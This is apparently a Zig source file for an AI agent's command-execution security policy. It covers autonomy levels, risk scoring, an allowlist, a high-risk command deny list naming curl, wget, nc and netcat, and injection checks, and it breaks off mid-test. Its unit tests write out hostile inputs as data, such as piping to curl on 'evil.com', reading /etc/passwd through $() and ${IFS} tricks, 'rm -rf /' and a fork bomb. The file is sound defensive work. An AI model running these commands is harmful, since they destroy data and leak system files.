const std = @import("std");
pub const RateTracker = @import("tracker.zig").RateTracker;
const scope = @import("scope.zig");

/// How much autonomy the agent has
pub const AutonomyLevel = enum {
    /// Read-only: can observe but not act
    read_only,
    /// Supervised: acts but requires approval for risky operations
    supervised,
    /// Full: autonomous execution within policy bounds
    full,

    pub fn default() AutonomyLevel {
        return .supervised;
    }

    pub fn toString(self: AutonomyLevel) []const u8 {
        return switch (self) {
            .read_only => "readonly",
            .supervised => "supervised",
            .full => "full",
        };
    }

    pub fn fromString(s: []const u8) ?AutonomyLevel {
        if (std.mem.eql(u8, s, "readonly") or std.mem.eql(u8, s, "read_only")) return .read_only;
        if (std.mem.eql(u8, s, "supervised")) return .supervised;
        if (std.mem.eql(u8, s, "full")) return .full;
        return null;
    }
};

/// Risk score for shell command execution.
pub const CommandRiskLevel = enum {
    low,
    medium,
    high,

    pub fn toString(self: CommandRiskLevel) []const u8 {
        return switch (self) {
            .low => "low",
            .medium => "medium",
            .high => "high",
        };
    }

    pub fn fromString(s: []const u8) ?CommandRiskLevel {
        if (std.mem.eql(u8, s, "low")) return .low;
        if (std.mem.eql(u8, s, "medium")) return .medium;
        if (std.mem.eql(u8, s, "high")) return .high;
        return null;
    }
};

// ── Structured policy deny ──────────────────────────────────────────

/// Why a command was denied.
pub const DenyCode = enum {
    /// Autonomy level is read_only — no actions permitted.
    read_only,
    /// Command exceeds maximum analysis length.
    oversized,
    /// Shell injection vector detected (backticks, $(), ${}, etc.).
    injection,
    /// Process substitution detected (<() or >()).
    process_substitution,
    /// Background chaining (&) detected.
    background_chain,
    /// Output redirection (>) detected.
    redirect,
    /// `tee` command blocked (arbitrary file write).
    tee_blocked,
    /// Command not in allowlist.
    not_allowed,
    /// Dangerous arguments for the command.
    unsafe_args,
    /// High-risk command blocked by policy.
    high_risk_blocked,
    /// Medium/high-risk command requires approval.
    approval_required,
    /// Rate limit exceeded.
    rate_limited,

    pub fn toString(self: DenyCode) []const u8 {
        return switch (self) {
            .read_only => "read_only",
            .oversized => "oversized",
            .injection => "injection",
            .process_substitution => "process_substitution",
            .background_chain => "background_chain",
            .redirect => "redirect",
            .tee_blocked => "tee_blocked",
            .not_allowed => "not_allowed",
            .unsafe_args => "unsafe_args",
            .high_risk_blocked => "high_risk_blocked",
            .approval_required => "approval_required",
            .rate_limited => "rate_limited",
        };
    }

    pub fn fromString(s: []const u8) ?DenyCode {
        if (std.mem.eql(u8, s, "read_only")) return .read_only;
        if (std.mem.eql(u8, s, "oversized")) return .oversized;
        if (std.mem.eql(u8, s, "injection")) return .injection;
        if (std.mem.eql(u8, s, "process_substitution")) return .process_substitution;
        if (std.mem.eql(u8, s, "background_chain")) return .background_chain;
        if (std.mem.eql(u8, s, "redirect")) return .redirect;
        if (std.mem.eql(u8, s, "tee_blocked")) return .tee_blocked;
        if (std.mem.eql(u8, s, "not_allowed")) return .not_allowed;
        if (std.mem.eql(u8, s, "unsafe_args")) return .unsafe_args;
        if (std.mem.eql(u8, s, "high_risk_blocked")) return .high_risk_blocked;
        if (std.mem.eql(u8, s, "approval_required")) return .approval_required;
        if (std.mem.eql(u8, s, "rate_limited")) return .rate_limited;
        return null;
    }

    /// Human-readable explanation for UI/logging.
    pub fn message(self: DenyCode) []const u8 {
        return switch (self) {
            .read_only => "agent is in read-only mode and cannot execute commands",
            .oversized => "command exceeds maximum allowed length",
            .injection => "shell injection pattern detected",
            .process_substitution => "process substitution is not allowed",
            .background_chain => "background execution (&) is not allowed",
            .redirect => "output redirection is not allowed",
            .tee_blocked => "tee command is blocked (can write to arbitrary files)",
            .not_allowed => "command is not in the allowlist",
            .unsafe_args => "command contains unsafe arguments",
            .high_risk_blocked => "high-risk command is blocked by policy",
            .approval_required => "command requires explicit approval",
            .rate_limited => "action rate limit exceeded",
        };
    }
};

/// Structured deny result with code, message, and matched-rule context.
pub const PolicyDeny = struct {
    /// Machine-readable deny reason.
    code: DenyCode,
    /// Risk level assessed at time of denial (null if denied before risk assessment).
    risk: ?CommandRiskLevel = null,
    /// The command (or prefix) that triggered the denial.
    command: ?[]const u8 = null,
    /// Specific pattern or rule that matched (e.g. "rm", "`", "$(").
    matched_rule: ?[]const u8 = null,

    /// Human-readable explanation (delegates to DenyCode.message).
    pub fn message(self: *const PolicyDeny) []const u8 {
        return self.code.message();
    }

    /// Serialize into a fixed buffer for logging. Returns written slice or null
    /// if the buffer is too small.
    pub fn writeJson(self: *const PolicyDeny, buf: []u8) ?[]const u8 {
        var fbs = std.io.fixedBufferStream(buf);
        const w = fbs.writer();
        w.print("{{\"code\":\"{s}\",\"message\":\"{s}\"", .{
            self.code.toString(),
            self.code.message(),
        }) catch return null;
        if (self.risk) |r| {
            w.print(",\"risk\":\"{s}\"", .{r.toString()}) catch return null;
        }
        if (self.matched_rule) |rule| {
            w.print(",\"matched_rule\":\"{s}\"", .{rule}) catch return null;
        }
        w.writeAll("}") catch return null;
        return fbs.getWritten();
    }
};

/// Result of a detailed policy check: either allowed with a risk level, or
/// denied with structured context. This replaces error-based flow for callers
/// that need explainability.
pub const PolicyResult = union(enum) {
    /// Command is allowed; payload is the assessed risk level.
    allowed: CommandRiskLevel,
    /// Command is denied; payload has structured context.
    denied: PolicyDeny,

    pub fn isAllowed(self: PolicyResult) bool {
        return self == .allowed;
    }

    pub fn isDenied(self: PolicyResult) bool {
        return self == .denied;
    }
};

/// Callback signature for policy-deny event hooks.
/// Implementations should be lightweight (e.g. append to a queue or log).
/// The `deny` pointer is only valid for the duration of the call.
pub const PolicyDenyHook = *const fn (deny: *const PolicyDeny) void;

/// High-risk commands that are always blocked/require elevated approval.
const high_risk_commands = [_][]const u8{
    "rm",       "mkfs",         "dd",     "shutdown", "reboot", "halt",
    "poweroff", "sudo",         "su",     "chown",    "chmod",  "useradd",
    "userdel",  "usermod",      "passwd", "mount",    "umount", "iptables",
    "ufw",      "firewall-cmd", "curl",   "wget",     "nc",     "ncat",
    "netcat",   "scp",          "ssh",    "ftp",      "telnet",
};

/// Default allowed commands
pub const default_allowed_commands = [_][]const u8{
    "git", "npm", "cargo", "ls", "cat", "grep", "find", "echo", "pwd", "wc", "head", "tail",
};

/// Security policy enforced on all tool executions
pub const SecurityPolicy = struct {
    autonomy: AutonomyLevel = .supervised,
    workspace_dir: []const u8 = ".",
    workspace_only: bool = true,
    allowed_commands: []const []const u8 = &default_allowed_commands,
    max_actions_per_hour: u32 = 20,
    require_approval_for_medium_risk: bool = true,
    block_high_risk_commands: bool = true,
    tracker: ?*RateTracker = null,
    /// Optional hook invoked on every policy denial for observability.
    deny_hook: ?PolicyDenyHook = null,
    /// Per-workspace policy overrides. When set, `resolveForWorkspace()` can
    /// produce a copy of this policy with workspace-specific settings applied.
    workspace_policies: []const scope.WorkspaceApprovalPolicy = &.{},

    /// Return a copy of this policy with workspace-specific overrides applied.
    /// Looks up the workspace in `workspace_policies` and resolves each field
    /// using the scope resolve helpers. If no override exists for the given
    /// workspace, the returned policy is identical to `self`.
    pub fn resolveForWorkspace(self: *const SecurityPolicy, workspace_id: []const u8) SecurityPolicy {
        const wp = scope.findWorkspacePolicy(self.workspace_policies, workspace_id);
        var resolved = self.*;
        resolved.autonomy = scope.resolveAutonomy(self.autonomy, wp);
        resolved.require_approval_for_medium_risk = scope.resolveApprovalForMediumRisk(
            self.require_approval_for_medium_risk,
            wp,
        );
        resolved.block_high_risk_commands = scope.resolveBlockHighRisk(
            self.block_high_risk_commands,
            wp,
        );
        resolved.max_actions_per_hour = scope.resolveMaxActionsPerHour(
            self.max_actions_per_hour,
            wp,
        );
        return resolved;
    }

    /// Classify command risk level.
    pub fn commandRiskLevel(self: *const SecurityPolicy, command: []const u8) CommandRiskLevel {
        _ = self;
        // Reject oversized commands as high-risk — never silently truncate
        if (command.len > MAX_ANALYSIS_LEN) return .high;

        // Normalize separators to null bytes for segment splitting
        var normalized: [MAX_ANALYSIS_LEN]u8 = undefined;
        const norm_len = normalizeCommand(command, &normalized);
        const norm = normalized[0..norm_len];

        var saw_medium = false;
        var iter = std.mem.splitScalar(u8, norm, 0);
        while (iter.next()) |raw_segment| {
            const segment = std.mem.trim(u8, raw_segment, " \t");
            if (segment.len == 0) continue;

            const cmd_part = skipEnvAssignments(segment);
            var words = std.mem.tokenizeScalar(u8, cmd_part, ' ');
            const base_raw = words.next() orelse continue;

            // Extract basename (after last '/')
            const base = extractBasename(base_raw);
            const lower_base = lowerBuf(base);
            const joined_lower = lowerBuf(cmd_part);

            // High-risk commands
            if (isHighRiskCommand(lower_base.slice())) return .high;

            // Check for destructive patterns
            if (containsStr(joined_lower.slice(), "rm -rf /") or
                containsStr(joined_lower.slice(), "rm -fr /") or
                containsStr(joined_lower.slice(), ":(){:|:&};:"))
            {
                return .high;
            }

            // Medium-risk commands
            const first_arg = words.next();
            const medium = classifyMedium(lower_base.slice(), first_arg);
            saw_medium = saw_medium or medium;
        }

        if (saw_medium) return .medium;
        return .low;
    }

    /// Validate full command execution policy (allowlist + risk gate).
    pub fn validateCommandExecution(
        self: *const SecurityPolicy,
        command: []const u8,
        approved: bool,
    ) error{ CommandNotAllowed, HighRiskBlocked, ApprovalRequired }!CommandRiskLevel {
        if (!self.isCommandAllowed(command)) {
            return error.CommandNotAllowed;
        }

        const risk = self.commandRiskLevel(command);

        if (risk == .high) {
            if (self.block_high_risk_commands) {
                return error.HighRiskBlocked;
            }
            if (self.autonomy == .supervised and !approved) {
                return error.ApprovalRequired;
            }
        }

        if (risk == .medium and
            self.autonomy == .supervised and
            self.require_approval_for_medium_risk and
            !approved)
        {
            return error.ApprovalRequired;
        }

        return risk;
    }

    /// Check if a shell command is allowed.
    pub fn isCommandAllowed(self: *const SecurityPolicy, command: []const u8) bool {
        if (self.autonomy == .read_only) return false;

        // Reject oversized commands — never silently truncate
        if (command.len > MAX_ANALYSIS_LEN) return false;

        // Block subshell/expansion operators
        if (containsStr(command, "`") or containsStr(command, "$(") or containsStr(command, "${")) {
            return false;
        }

        // Block process substitution
        if (containsStr(command, "<(") or containsStr(command, ">(")) {
            return false;
        }

        // Block Windows %VAR% environment variable expansion (cmd.exe attack surface)
        if (comptime @import("builtin").os.tag == .windows) {
            if (hasPercentVar(command)) return false;
        }

        // Block `tee` — can write to arbitrary files, bypassing redirect checks
        {
            var words_iter = std.mem.tokenizeAny(u8, command, " \t\n;|");
            while (words_iter.next()) |word| {
                if (std.mem.eql(u8, word, "tee") or std.mem.eql(u8, extractBasename(word), "tee")) {
                    return false;
                }
            }
        }

        // Block single & background chaining (&& is allowed)
        if (containsSingleAmpersand(command)) return false;

        // Block output redirections
        if (std.mem.indexOfScalar(u8, command, '>') != null) return false;

        var normalized: [MAX_ANALYSIS_LEN]u8 = undefined;
        const norm_len = normalizeCommand(command, &normalized);
        const norm = normalized[0..norm_len];

        var has_cmd = false;
        var iter = std.mem.splitScalar(u8, norm, 0);
        while (iter.next()) |raw_segment| {
            const segment = std.mem.trim(u8, raw_segment, " \t");
            if (segment.len == 0) continue;

            const cmd_part = skipEnvAssignments(segment);
            var words = std.mem.tokenizeScalar(u8, cmd_part, ' ');
            const first_word = words.next() orelse continue;
            if (first_word.len == 0) continue;

            const base_cmd = extractBasename(first_word);
            if (base_cmd.len == 0) continue;

            has_cmd = true;

            var found = false;
            for (self.allowed_commands) |allowed| {
                if (std.mem.eql(u8, allowed, base_cmd)) {
                    found = true;
                    break;
                }
            }
            if (!found) return false;

            // Block dangerous arguments for specific commands
            if (!isArgsSafe(base_cmd, cmd_part)) return false;
        }

        return has_cmd;
    }

    /// Check if autonomy level permits any action at all
    pub fn canAct(self: *const SecurityPolicy) bool {
        return self.autonomy != .read_only;
    }

    /// Record an action and check if the rate limit has been exceeded.
    /// Returns true if the action is allowed, false if rate-limited.
    pub fn recordAction(self: *const SecurityPolicy) !bool {
        if (self.tracker) |tracker| {
            return tracker.recordAction();
        }
        return true;
    }

    /// Check if the rate limit would be exceeded without recording.
    pub fn isRateLimited(self: *const SecurityPolicy) bool {
        if (self.tracker) |tracker| {
            return tracker.isLimited();
        }
        return false;
    }

    /// Detailed command allowlist check returning structured deny on failure.
    pub fn isCommandAllowedDetailed(self: *const SecurityPolicy, command: []const u8) ?PolicyDeny {
        if (self.autonomy == .read_only) return .{ .code = .read_only };

        if (command.len > MAX_ANALYSIS_LEN) return .{ .code = .oversized };

        // Block subshell/expansion operators
        if (containsStr(command, "`")) return .{ .code = .injection, .matched_rule = "`" };
        if (containsStr(command, "$(")) return .{ .code = .injection, .matched_rule = "$(" };
        if (containsStr(command, "${")) return .{ .code = .injection, .matched_rule = "${" };

        // Block process substitution
        if (containsStr(command, "<(")) return .{ .code = .process_substitution, .matched_rule = "<(" };
        if (containsStr(command, ">(")) return .{ .code = .process_substitution, .matched_rule = ">(" };

        // Block Windows %VAR% environment variable expansion (cmd.exe attack surface)
        if (comptime @import("builtin").os.tag == .windows) {
            if (hasPercentVar(command)) return .{ .code = .injection, .matched_rule = "%VAR%" };
        }

        // Block `tee`
        {
            var words_iter = std.mem.tokenizeAny(u8, command, " \t\n;|");
            while (words_iter.next()) |word| {
                if (std.mem.eql(u8, word, "tee") or std.mem.eql(u8, extractBasename(word), "tee")) {
                    return .{ .code = .tee_blocked, .matched_rule = "tee" };
                }
            }
        }

        // Block single & background chaining
        if (containsSingleAmpersand(command)) return .{ .code = .background_chain, .matched_rule = "&" };

        // Block output redirections
        if (std.mem.indexOfScalar(u8, command, '>') != null) return .{ .code = .redirect, .matched_rule = ">" };

        var normalized: [MAX_ANALYSIS_LEN]u8 = undefined;
        const norm_len = normalizeCommand(command, &normalized);
        const norm = normalized[0..norm_len];

        var has_cmd = false;
        var iter = std.mem.splitScalar(u8, norm, 0);
        while (iter.next()) |raw_segment| {
            const segment = std.mem.trim(u8, raw_segment, " \t");
            if (segment.len == 0) continue;

            const cmd_part = skipEnvAssignments(segment);
            var words = std.mem.tokenizeScalar(u8, cmd_part, ' ');
            const first_word = words.next() orelse continue;
            if (first_word.len == 0) continue;

            const base_cmd = extractBasename(first_word);
            if (base_cmd.len == 0) continue;

            has_cmd = true;

            var found = false;
            for (self.allowed_commands) |allowed| {
                if (std.mem.eql(u8, allowed, base_cmd)) {
                    found = true;
                    break;
                }
            }
            if (!found) return .{ .code = .not_allowed, .matched_rule = base_cmd, .command = command };

            if (!isArgsSafe(base_cmd, cmd_part)) return .{ .code = .unsafe_args, .matched_rule = base_cmd, .command = command };
        }

        if (!has_cmd) return .{ .code = .not_allowed };

        return null; // allowed
    }

    /// Structured alternative to `validateCommandExecution`. Returns a
    /// `PolicyResult` with full deny context instead of a bare error.
    /// Fires the `deny_hook` callback on denial.
    pub fn validateCommandDetailed(
        self: *const SecurityPolicy,
        command: []const u8,
        approved: bool,
    ) PolicyResult {
        // Allowlist / injection checks
        if (self.isCommandAllowedDetailed(command)) |deny| {
            var d = deny;
            d.command = command;
            self.fireDenyHook(&d);
            return .{ .denied = d };
        }

        const risk = self.commandRiskLevel(command);

        if (risk == .high) {
            if (self.block_high_risk_commands) {
                var d = PolicyDeny{ .code = .high_risk_blocked, .risk = .high, .command = command };
                self.fireDenyHook(&d);
                return .{ .denied = d };
            }
            if (self.autonomy == .supervised and !approved) {
                var d = PolicyDeny{ .code = .approval_required, .risk = .high, .command = command };
                self.fireDenyHook(&d);
                return .{ .denied = d };
            }
        }

        if (risk == .medium and
            self.autonomy == .supervised and
            self.require_approval_for_medium_risk and
            !approved)
        {
            var d = PolicyDeny{ .code = .approval_required, .risk = .medium, .command = command };
            self.fireDenyHook(&d);
            return .{ .denied = d };
        }

        return .{ .allowed = risk };
    }

    /// Invoke the deny hook if configured.
    fn fireDenyHook(self: *const SecurityPolicy, deny: *const PolicyDeny) void {
        if (self.deny_hook) |hook| {
            hook(deny);
        }
    }
};

/// Maximum command/path length for security analysis.
/// Commands or paths exceeding this are rejected outright — never silently truncated.
/// 16 KB covers even the longest realistic shell commands while preventing
/// abuse via oversized payloads. Peak stack usage: ~64 KB (4 buffers via
/// commandRiskLevel → lowerBuf × 2 + classifyMedium → lowerBuf).
const MAX_ANALYSIS_LEN: usize = 16384;

// ── Internal helpers ──────────────────────────────────────────────────

/// Normalize command by replacing separators with null bytes.
/// Callers MUST ensure `command.len <= buf.len` (enforced by early rejection
/// in isCommandAllowed / commandRiskLevel). Returns 0 as a safe fallback
/// if the invariant is violated in release builds.
fn normalizeCommand(command: []const u8, buf: []u8) usize {
    if (command.len > buf.len) return 0;
    const len = command.len;
    @memcpy(buf[0..len], command[0..len]);
    const result = buf[0..len];

    // Replace "&&" and "||" with "\x00\x00"
    replacePair(result, "&&");
    replacePair(result, "||");

    // Replace single separators
    for (result) |*c| {
        if (c.* == '\n' or c.* == ';' or c.* == '|') c.* = 0;
    }
    return len;
}

fn replacePair(buf: []u8, pat: *const [2]u8) void {
    if (buf.len < 2) return;
    var i: usize = 0;
    while (i < buf.len - 1) : (i += 1) {
        if (buf[i] == pat[0] and buf[i + 1] == pat[1]) {
            buf[i] = 0;
            buf[i + 1] = 0;
            i += 1;
        }
    }
}

/// Detect a single `&` operator (background/chain). `&&` is allowed.
/// We treat any standalone `&` as unsafe because it enables background
/// process chaining that can escape foreground timeout expectations.
fn containsSingleAmpersand(s: []const u8) bool {
    if (s.len == 0) return false;
    for (s, 0..) |b, i| {
        if (b != '&') continue;
        const prev_is_amp = i > 0 and s[i - 1] == '&';
        const next_is_amp = i + 1 < s.len and s[i + 1] == '&';
        if (!prev_is_amp and !next_is_amp) return true;
    }
    return false;
}

/// Skip leading environment variable assignments (e.g. `FOO=bar cmd args`)
fn skipEnvAssignments(s: []const u8) []const u8 {
    var rest = s;
    while (true) {
        const trimmed = std.mem.trim(u8, rest, " \t");
        if (trimmed.len == 0) return rest;

        // Find end of first word
        const word_end = std.mem.indexOfAny(u8, trimmed, " \t") orelse trimmed.len;
        const word = trimmed[0..word_end];

        // Check if it's an env assignment
        if (std.mem.indexOfScalar(u8, word, '=')) |_| {
            // Must start with letter or underscore
            if (word.len > 0 and (std.ascii.isAlphabetic(word[0]) or word[0] == '_')) {
                rest = if (word_end < trimmed.len) trimmed[word_end..] else "";
                continue;
            }
        }
        return trimmed;
    }
}

/// Extract basename from a path (everything after last separator)
fn extractBasename(path: []const u8) []const u8 {
    return std.fs.path.basename(path);
}

/// Check if a command basename is in the high-risk set
fn isHighRiskCommand(base: []const u8) bool {
    for (&high_risk_commands) |cmd| {
        if (std.mem.eql(u8, base, cmd)) return true;
    }
    return false;
}

/// Classify whether a command is medium-risk based on its name and first argument
fn classifyMedium(base: []const u8, first_arg_raw: ?[]const u8) bool {
    const first_arg = if (first_arg_raw) |a| lowerBuf(a).slice() else "";

    if (std.mem.eql(u8, base, "git")) {
        return isGitMediumVerb(first_arg);
    }
    if (std.mem.eql(u8, base, "npm") or std.mem.eql(u8, base, "pnpm") or std.mem.eql(u8, base, "yarn")) {
        return isNpmMediumVerb(first_arg);
    }
    if (std.mem.eql(u8, base, "cargo")) {
        return isCargoMediumVerb(first_arg);
    }
    if (std.mem.eql(u8, base, "touch") or std.mem.eql(u8, base, "mkdir") or
        std.mem.eql(u8, base, "mv") or std.mem.eql(u8, base, "cp") or
        std.mem.eql(u8, base, "ln"))
    {
        return true;
    }
    return false;
}

fn isGitMediumVerb(verb: []const u8) bool {
    const map = std.StaticStringMap(void).initComptime(.{
        .{ "commit", {} },      .{ "push", {} },   .{ "reset", {} },
        .{ "clean", {} },       .{ "rebase", {} }, .{ "merge", {} },
        .{ "cherry-pick", {} }, .{ "revert", {} }, .{ "branch", {} },
        .{ "checkout", {} },    .{ "switch", {} }, .{ "tag", {} },
    });
    return map.has(verb);
}

fn isNpmMediumVerb(verb: []const u8) bool {
    const map = std.StaticStringMap(void).initComptime(.{
        .{ "install", {} },   .{ "add", {} },    .{ "remove", {} },
        .{ "uninstall", {} }, .{ "update", {} }, .{ "publish", {} },
    });
    return map.has(verb);
}

fn isCargoMediumVerb(verb: []const u8) bool {
    const map = std.StaticStringMap(void).initComptime(.{
        .{ "add", {} },   .{ "remove", {} },  .{ "install", {} },
        .{ "clean", {} }, .{ "publish", {} },
    });
    return map.has(verb);
}

/// Check for dangerous arguments that allow sub-command execution.
fn isArgsSafe(base_cmd: []const u8, full_cmd: []const u8) bool {
    const lower_base = lowerBuf(base_cmd);
    const lower_cmd = lowerBuf(full_cmd);
    const base = lower_base.slice();
    const cmd = lower_cmd.slice();

    if (std.mem.eql(u8, base, "find")) {
        // find -exec and find -ok allow arbitrary command execution
        var iter = std.mem.tokenizeScalar(u8, cmd, ' ');
        while (iter.next()) |arg| {
            if (std.mem.eql(u8, arg, "-exec") or std.mem.eql(u8, arg, "-ok")) {
                return false;
            }
        }
        return true;
    }

    if (std.mem.eql(u8, base, "git")) {
        // git config, alias, and -c can set dangerous options
        var iter = std.mem.tokenizeScalar(u8, cmd, ' ');
        _ = iter.next(); // skip "git" itself
        while (iter.next()) |arg| {
            if (std.mem.eql(u8, arg, "config") or
                std.mem.startsWith(u8, arg, "config.") or
                std.mem.eql(u8, arg, "alias") or
                std.mem.startsWith(u8, arg, "alias.") or
                std.mem.eql(u8, arg, "-c"))
            {
                return false;
            }
        }
        return true;
    }

    return true;
}

fn containsStr(haystack: []const u8, needle: []const u8) bool {
    return std.mem.indexOf(u8, haystack, needle) != null;
}

/// Detect `%VARNAME%` patterns used by cmd.exe for environment variable expansion.
fn hasPercentVar(s: []const u8) bool {
    var i: usize = 0;
    while (i < s.len) : (i += 1) {
        if (s[i] == '%') {
            // Look for closing %
            if (std.mem.indexOfScalarPos(u8, s, i + 1, '%')) |end| {
                if (end > i + 1) return true; // non-empty %VAR%
                i = end; // skip %% (literal percent escape)
            }
        }
    }
    return false;
}

/// Fixed-size buffer for lowercase conversion
const LowerResult = struct {
    buf: [MAX_ANALYSIS_LEN]u8 = undefined,
    len: usize = 0,

    pub fn slice(self: *const LowerResult) []const u8 {
        return self.buf[0..self.len];
    }
};

fn lowerBuf(s: []const u8) LowerResult {
    var result = LowerResult{};
    result.len = @min(s.len, result.buf.len);
    for (s[0..result.len], 0..) |c, i| {
        result.buf[i] = std.ascii.toLower(c);
    }
    return result;
}

// ── Tests ──────────────────────────────────────────────────────────────

test "autonomy default is supervised" {
    try std.testing.expectEqual(AutonomyLevel.supervised, AutonomyLevel.default());
}

test "autonomy toString roundtrip" {
    try std.testing.expectEqualStrings("full", AutonomyLevel.full.toString());
    try std.testing.expectEqual(AutonomyLevel.read_only, AutonomyLevel.fromString("readonly").?);
    try std.testing.expectEqual(AutonomyLevel.supervised, AutonomyLevel.fromString("supervised").?);
    try std.testing.expectEqual(AutonomyLevel.full, AutonomyLevel.fromString("full").?);
}

test "can act readonly false" {
    const p = SecurityPolicy{ .autonomy = .read_only };
    try std.testing.expect(!p.canAct());
}

test "can act supervised true" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.canAct());
}

test "can act full true" {
    const p = SecurityPolicy{ .autonomy = .full };
    try std.testing.expect(p.canAct());
}

test "allowed commands basic" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("ls"));
    try std.testing.expect(p.isCommandAllowed("git status"));
    try std.testing.expect(p.isCommandAllowed("cargo build --release"));
    try std.testing.expect(p.isCommandAllowed("cat file.txt"));
    try std.testing.expect(p.isCommandAllowed("grep -r pattern ."));
}

test "blocked commands basic" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("rm -rf /"));
    try std.testing.expect(!p.isCommandAllowed("sudo apt install"));
    try std.testing.expect(!p.isCommandAllowed("curl http://evil.com"));
    try std.testing.expect(!p.isCommandAllowed("wget http://evil.com"));
    try std.testing.expect(!p.isCommandAllowed("python3 exploit.py"));
    try std.testing.expect(!p.isCommandAllowed("node malicious.js"));
}

test "readonly blocks all commands" {
    const p = SecurityPolicy{ .autonomy = .read_only };
    try std.testing.expect(!p.isCommandAllowed("ls"));
    try std.testing.expect(!p.isCommandAllowed("cat file.txt"));
    try std.testing.expect(!p.isCommandAllowed("echo hello"));
}

test "command with absolute path extracts basename" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("/usr/bin/git status"));
    try std.testing.expect(p.isCommandAllowed("/bin/ls -la"));
}

test "empty command blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed(""));
    try std.testing.expect(!p.isCommandAllowed("   "));
}

test "command with pipes validates all segments" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("ls | grep foo"));
    try std.testing.expect(p.isCommandAllowed("cat file.txt | wc -l"));
    try std.testing.expect(!p.isCommandAllowed("ls | curl http://evil.com"));
    try std.testing.expect(!p.isCommandAllowed("echo hello | python3 -"));
}

test "command injection semicolon blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("ls; rm -rf /"));
    try std.testing.expect(!p.isCommandAllowed("ls;rm -rf /"));
}

test "command injection backtick blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo `whoami`"));
    try std.testing.expect(!p.isCommandAllowed("echo `rm -rf /`"));
}

test "command injection dollar paren blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo $(cat /etc/passwd)"));
    try std.testing.expect(!p.isCommandAllowed("echo $(rm -rf /)"));
}

test "command injection redirect blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo secret > /etc/crontab"));
    try std.testing.expect(!p.isCommandAllowed("ls >> /tmp/exfil.txt"));
}

test "command injection dollar brace blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo ${IFS}cat${IFS}/etc/passwd"));
}

test "command env var prefix with allowed cmd" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("FOO=bar ls"));
    try std.testing.expect(p.isCommandAllowed("LANG=C grep pattern file"));
    try std.testing.expect(!p.isCommandAllowed("FOO=bar rm -rf /"));
}

test "command and chain validates both" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("ls && rm -rf /"));
    try std.testing.expect(p.isCommandAllowed("ls && echo done"));
}

test "command or chain validates both" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("ls || rm -rf /"));
    try std.testing.expect(p.isCommandAllowed("ls || echo fallback"));
}

test "command newline injection blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("ls\nrm -rf /"));
    try std.testing.expect(p.isCommandAllowed("ls\necho hello"));
}

test "command risk low for read commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("git status"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("ls -la"));
}

test "command risk medium for mutating commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git reset --hard HEAD~1"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("touch file.txt"));
}

test "command risk high for dangerous commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -rf /tmp/test"));
}

test "validate command requires approval for medium risk" {
    const allowed = [_][]const u8{"touch"};
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .require_approval_for_medium_risk = true,
        .allowed_commands = &allowed,
    };

    const denied = p.validateCommandExecution("touch test.txt", false);
    try std.testing.expectError(error.ApprovalRequired, denied);

    const ok = try p.validateCommandExecution("touch test.txt", true);
    try std.testing.expectEqual(CommandRiskLevel.medium, ok);
}

test "validate command blocks high risk by default" {
    const allowed = [_][]const u8{"rm"};
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .allowed_commands = &allowed,
    };
    const result = p.validateCommandExecution("rm -rf /tmp/test", true);
    try std.testing.expectError(error.HighRiskBlocked, result);
}

test "rate tracker starts at zero" {
    var tracker = RateTracker.init(std.testing.allocator, 10);
    defer tracker.deinit();
    try std.testing.expectEqual(@as(usize, 0), tracker.count());
}

test "rate tracker records actions" {
    var tracker = RateTracker.init(std.testing.allocator, 100);
    defer tracker.deinit();
    try std.testing.expect(try tracker.recordAction());
    try std.testing.expect(try tracker.recordAction());
    try std.testing.expect(try tracker.recordAction());
    try std.testing.expectEqual(@as(usize, 3), tracker.count());
}

test "record action allows within limit" {
    var tracker = RateTracker.init(std.testing.allocator, 5);
    defer tracker.deinit();
    var p = SecurityPolicy{
        .max_actions_per_hour = 5,
        .tracker = &tracker,
    };
    _ = &p;
    for (0..5) |_| {
        try std.testing.expect(try p.recordAction());
    }
}

test "record action blocks over limit" {
    var tracker = RateTracker.init(std.testing.allocator, 3);
    defer tracker.deinit();
    var p = SecurityPolicy{
        .max_actions_per_hour = 3,
        .tracker = &tracker,
    };
    _ = &p;
    try std.testing.expect(try p.recordAction()); // 1
    try std.testing.expect(try p.recordAction()); // 2
    try std.testing.expect(try p.recordAction()); // 3
    try std.testing.expect(!try p.recordAction()); // 4 — over limit
}

test "is rate limited reflects count" {
    var tracker = RateTracker.init(std.testing.allocator, 2);
    defer tracker.deinit();
    var p = SecurityPolicy{
        .max_actions_per_hour = 2,
        .tracker = &tracker,
    };
    _ = &p;
    try std.testing.expect(!p.isRateLimited());
    _ = try p.recordAction();
    try std.testing.expect(!p.isRateLimited());
    _ = try p.recordAction();
    try std.testing.expect(p.isRateLimited());
}

test "default policy has sane values" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(AutonomyLevel.supervised, p.autonomy);
    try std.testing.expect(p.workspace_only);
    try std.testing.expect(p.allowed_commands.len > 0);
    try std.testing.expect(p.max_actions_per_hour > 0);
    try std.testing.expect(p.require_approval_for_medium_risk);
